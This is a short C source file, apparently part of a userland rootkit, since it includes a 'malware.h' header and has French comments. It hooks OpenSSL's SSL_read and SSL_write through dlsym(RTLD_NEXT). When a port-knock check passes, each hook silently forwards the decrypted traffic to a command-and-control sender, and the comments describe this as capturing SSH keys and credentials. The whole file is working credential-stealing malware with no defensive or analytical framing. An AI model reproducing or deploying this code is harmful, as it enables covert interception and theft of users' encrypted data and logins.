#include "headers/malware.h"

// Hook de SSL_read (Récupère les clés SSH)
int SSL_read(SSL *ssl, void *buf, int num) {
    static int (*orig_SSL_read)(SSL *, void *, int) = NULL;
    if (!orig_SSL_read) orig_SSL_read = dlsym(RTLD_NEXT, "SSL_read");

    int bytes = orig_SSL_read(ssl, buf, num);
    if (bytes > 0 && check_knock()) {
        send_to_c2(buf, bytes);
    }

    return bytes;
}

// Hook de SSL_write (Capture les identifiants SSH)
int SSL_write(SSL *ssl, const void *buf, int num) {
    static int (*orig_SSL_write)(SSL *, const void *, int) = NULL;
    if (!orig_SSL_write) orig_SSL_write = dlsym(RTLD_NEXT, "SSL_write");

    if (check_knock()) {
        send_to_c2(buf, num);
    }

    return orig_SSL_write(ssl, buf, num);
}



